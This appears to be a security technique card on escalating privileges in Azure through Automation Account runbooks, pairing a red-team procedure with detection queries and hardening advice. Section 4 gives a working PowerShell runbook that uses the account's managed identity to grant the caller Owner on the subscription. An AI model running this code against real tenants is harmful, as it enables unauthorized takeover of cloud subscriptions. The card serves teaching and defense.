# [PE-ACCTMGMT-008]: Azure Automation Runbook Escalation

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-008 |
| **MITRE ATT&CK v18.1** | [Account Manipulation (T1098)](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Azure |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Azure Automation Accounts are used to automate management tasks. They often have a "Run As" account (Service Principal) or a System-Assigned Managed Identity that is assigned `Contributor` or `Owner` on the entire Subscription to perform its duties. If a user has `Automation Contributor` rights (which does not look like "Subscription Admin"), they can create or edit a PowerShell Runbook. When this runbook executes, it runs with the privileges of the Automation Account's identity, effectively escalating the user to Subscription Owner.
- **Attack Surface:** Automation Accounts.
- **Business Impact:** **Vertical Escalation**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Automation Contributor (or rights to edit runbooks).
- **Tools:**
    - Azure Portal / PowerShell

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Check Identity**
Check permissions of the Automation Account's Managed Identity.
```bash
az ad sp show --id <IdentityID>
```

**Step 2: Edit Runbook**
Create a new PowerShell runbook.
```powershell
# Runbook Code
Connect-AzAccount -Identity
$Context = Get-AzContext
New-AzRoleAssignment -ObjectId <MyUserObjectID> -RoleDefinitionName "Owner" -Scope "/subscriptions/$($Context.Subscription.Id)"
```

**Step 3: Publish & Start**
Publish the runbook and start a job.

## 5. DETECTION (Blue Team Operations)

#### 5.1 Azure Activity Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Automation** | `Write Runbook` | Creation or modification of runbooks by non-standard users. |
| **Authorization** | `Write RoleAssignment` | Role assignment initiated by an Automation Account identity (Service Principal). |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Least Privilege:** Ensure Automation Account identities only have rights to the specific resources they manage (e.g., "Virtual Machine Contributor" on RG-A), not "Contributor" on the Subscription.
*   **Separation:** Users who can edit runbooks should be trusted as much as the identity the runbook uses.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-003]
> **Next Logical Step:** [PE-VALID-011]
